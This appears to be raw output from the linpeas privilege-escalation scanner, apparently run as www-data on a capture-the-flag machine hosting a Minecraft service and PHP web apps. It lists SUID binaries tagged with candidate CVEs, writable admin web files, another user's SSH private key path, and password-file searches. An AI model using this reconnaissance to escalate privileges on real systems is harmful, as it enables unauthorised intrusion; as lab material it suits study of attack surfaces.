-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 /home/xxultimatecreeperxx/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)

lrwxrwxrwx 1 root root 9 Oct 15  2021 /home/xxultimatecreeperxx/.viminfo -> /dev/null


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 Oct  7  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jul  5  2021 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 20 Jun 26  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jun 26  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Sep 12  2021 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 3771 Jun 27  2021 /home/xxultimatecreeperxx/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 807 Jun 27  2021 /home/xxultimatecreeperxx/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 116K Mar 26  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 355K Aug 11  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 26912 Mar 26  2021 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1793 Apr 23  2021 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-03-08+18:59:58.6021454460 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
2023-03-08+18:59:58.5995905690 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
2023-03-08+18:59:58.5969078930 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
2023-03-08+18:59:58.5941463810 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
2023-03-08+18:59:58.5915073840 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
2023-03-08+18:59:58.5888165450 /var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/cgroup.event_control
2023-03-08+18:59:58.5860111770 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
2023-03-08+18:59:58.5833479250 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
2023-03-08+18:59:58.5806428960 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
2023-03-08+18:59:58.5780212650 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
2023-03-08+18:59:58.5753064500 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
2023-03-08+18:59:58.5725609350 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
2023-03-08+18:59:58.5697549260 /var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
2023-03-08+18:59:58.5671010320 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
2023-03-08+18:59:58.5642832510 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
2023-03-08+18:59:58.5616239170 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
2023-03-08+18:59:58.5589497320 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
2023-03-08+18:59:58.5563342400 /var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service/cgroup.event_control
2023-03-08+18:59:58.5536495280 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
2023-03-08+18:59:58.5484125600 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
2023-03-08+18:59:58.5457385800 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
2023-03-08+18:59:58.5430724330 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
2023-03-08+18:59:58.5403820470 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
2023-03-08+18:59:58.5376005830 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
2023-03-08+18:59:58.5348534250 /var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
2023-03-08+18:59:58.5322459390 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
2023-03-08+18:59:58.5296108480 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
2023-03-08+18:59:58.5268484610 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
2023-03-08+18:59:58.5242441670 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
2023-03-08+18:59:58.5215247550 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
2023-03-08+18:59:58.5188137050 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
2023-03-08+18:59:58.5162198510 /var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
2023-03-08+18:59:58.5136225200 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
2023-03-08+18:59:58.5107679990 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
2023-03-08+18:59:58.5081983670 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
2021-09-12+10:32:21.9685602040 /var/www/tld/index.html
2021-09-12+10:28:20.2288650360 /var/www/store/search.php
2021-09-12+09:46:09.4611556070 /var/www/html/index.php
2021-06-26+16:28:41.2009863390 /var/www/store/assets/styles.css

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root         root      4096 Jun 27  2021 .
drwxr-xr-x 24 root         root      4096 Sep 30  2021 ..
drwxr-x---  4 cybercrafted minecraft 4096 Jun 27  2021 minecraft

╔══════════╣ Unexpected in root
/initrd.img
/initrd.img.old
/swap.img
/vmlinuz.old
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 36
drwxr-xr-x   2 root root 4096 Jun 26  2021 .
drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  833 Feb  2  2021 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/xxultimatecreeperxx/.bash_history
/home/xxultimatecreeperxx/.viminfo
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log
/var/log/kern.log
/var/log/syslog
/var/log/journal/ebe56de9a97145f5aa1f42ef72793146/system.journal

logrotate 3.11.0

╔══════════╣ Files inside /home/www-data (limit 20)

╔══════════╣ Files inside others home (limit 20)
/home/xxultimatecreeperxx/.profile
/home/xxultimatecreeperxx/.hushlogin
/home/xxultimatecreeperxx/.ssh/id_rsa
/home/xxultimatecreeperxx/.ssh/authorized_keys
/home/xxultimatecreeperxx/.bashrc
/home/xxultimatecreeperxx/.bash_logout
/var/www/admin/login.php
/var/www/admin/panel.php
/var/www/admin/index.php
/var/www/admin/assets/login.css
/var/www/admin/assets/logo.png
/var/www/admin/assets/command.png
/var/www/admin/assets/panel.css
/var/www/admin/assets/logBackground.png
/var/www/admin/assets/lowercase.ttf
/var/www/admin/assets/mainBackground.png
/var/www/admin/assets/uppercase.ttf
/var/www/admin/dbConn.php
/var/www/store/search.php
/var/www/store/index.html

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 11755 Jun 26  2021 /usr/share/info/dir.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 1775 Feb 25  2021 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1424 Jun 26  2021 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 217443 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/.config.old
-rw-r--r-- 1 root root 0 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217425 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/.config.old
-rw-r--r-- 1 root root 0 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 8881 Aug 19  2021 /lib/modules/4.15.0-156-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Aug 19  2021 /lib/modules/4.15.0-156-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Sep 20  2021 /lib/modules/4.15.0-159-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Sep 20  2021 /lib/modules/4.15.0-159-generic/kernel/drivers/power/supply/wm831x_backup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 24K
drwxr-xr-x  6 root     root     4.0K Jun 26  2021 .
drwxr-xr-x 14 root     root     4.0K Jun 26  2021 ..
drwxr-xr-x  3 www-data www-data 4.0K Sep 12  2021 admin
drwxr-xr-x  2 www-data www-data 4.0K Sep 12  2021 html
drwxr-xr-x  3 www-data www-data 4.0K Sep 12  2021 store
drwxr-xr-x  4 www-data www-data 4.0K Sep 12  2021 tld

/var/www/admin:

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-rw-r-- 1 xxultimatecreeperxx xxultimatecreeperxx 0 Jun 27  2021 /home/xxultimatecreeperxx/.hushlogin
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 220 Jun 27  2021 /home/xxultimatecreeperxx/.bash_logout
-rw-r--r-- 1 root root 20 Mar  8 16:27 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Mar  8 16:27 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 landscape landscape 0 Aug  6  2020 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 2047 Apr 21  2021 /usr/lib/jvm/.java-1.11.0-openjdk-amd64.jinfo
-rw-r--r-- 1 root root 2764 Apr 21  2021 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo
-rw-r--r-- 1 root root 0 Jun 27  2021 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 0 Jun 27  2021 /etc/.java/.systemPrefs/.system.lock
-rw------- 1 root root 0 Aug  6  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1531 Jun 26  2021 /etc/apparmor.d/cache/.features

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 www-data www-data 828098 Feb 10 20:38 /tmp/linpeas.sh
-rw-r--r-- 1 root root 3529 Jun 26  2021 /var/backups/apt.extended_states.4.gz
-rw-r--r-- 1 root root 4247 Sep 30  2021 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 4227 Sep 12  2021 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 4201 Jun 27  2021 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 39711 Oct  4  2021 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/tmp
/tmp/linpeas.sh
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2x2dpvscan.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www/admin
/var/www/admin/assets
/var/www/admin/assets/login.css
/var/www/admin/assets/lowercase.ttf
/var/www/admin/assets/panel.css
/var/www/admin/assets/uppercase.ttf
/var/www/admin/dbConn.php
/var/www/admin/index.php
/var/www/admin/login.php
/var/www/admin/panel.php
/var/www/html
/var/www/html/index.php
/var/www/store
/var/www/store/assets
/var/www/store/assets/lowercase.ttf
/var/www/store/assets/styles.css
/var/www/store/assets/uppercase.ttf
/var/www/store/index.html
/var/www/store/search.php
/var/www/tld
/var/www/tld/assets
/var/www/tld/index.html
/var/www/tld/secret

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/java-8-openjdk/management/jmxremote.password
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/management/jmxremote.password
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2021-06-26 10:16:02,270 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
2021-06-26 10:16:02,271 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2021-06-26 10:16:02,326 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2021-06-26 10:16:02,327 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2021-06-26 10:50:34,430 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 10:50:34,430 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-26 14:23:39,220 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 14:23:39,220 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-26 16:34:18,784 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 16:34:18,784 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-26 17:26:41,243 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 17:26:41,243 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 08:13:02,795 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 08:13:02,795 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 09:15:04,874 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 09:15:04,874 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 13:25:09,261 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 13:25:09,261 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 14:46:44,157 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 14:46:44,157 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 15:11:52,659 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
